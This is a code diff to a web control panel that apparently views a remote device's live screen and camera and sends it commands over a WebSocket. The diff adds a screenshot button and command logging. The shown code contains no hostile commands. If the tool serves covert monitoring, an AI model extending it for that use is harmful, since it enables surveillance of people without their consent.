@@ -697,7 +697,13 @@
         const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
         pc.ontrack = (e) => {
             if (streamType === 'screen') {
-                panel.innerHTML = '<video autoplay playsinline style="width:100%; height:100%;"></video>';
+                panel.innerHTML = `
+                    <video autoplay playsinline style="width:100%; height:auto;"></video>
+                    <div class="live-controls">
+                        <button onclick="snapScreen()">📸 Snap Screen</button>
+                        <button class="stop" onclick="toggleScreen()">⏹ Stop Screen</button>
+                    </div>
+                `;
                 document.querySelector('video').srcObject = e.streams[0];
             } else if (streamType === 'camera') {
                 const video = document.getElementById('liveCamVideo');
@@ -763,6 +769,27 @@
                 screenPC = null;
             }
         }
+    }
+
+    // ---------- SNAP SCREEN (capture current video frame) ----------
+    function snapScreen() {
+        const video = document.querySelector('video');
+        if (!video || !video.videoWidth) {
+            alert('No active screen share or video not ready');
+            return;
+        }
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `screen_${Date.now()}.png`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }, 'image/png');
     }
 
     // ---------- LIVE CAMERA ----------
@@ -918,7 +945,9 @@
             params: params,
             timestamp: Date.now()
         };
-        ws.send(JSON.stringify(payload));
+        const json = JSON.stringify(payload);
+        console.log('📤 Sending command:', json); // <-- Added logging
+        ws.send(json);
         panel.innerHTML = `📤 Command sent: ${command}`;
         // Set pending command for response handling
         pendingCommand = command;
@@ -1498,6 +1527,7 @@
     window.updateSelected = updateSelected;
     window.downloadSelected = downloadSelected;
     window.connectWebSocket = connectWebSocket;
+    window.snapScreen = snapScreen; // <-- Added
 
     // Additional binding for screen share button (to avoid inline onclick conflict)
     document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);
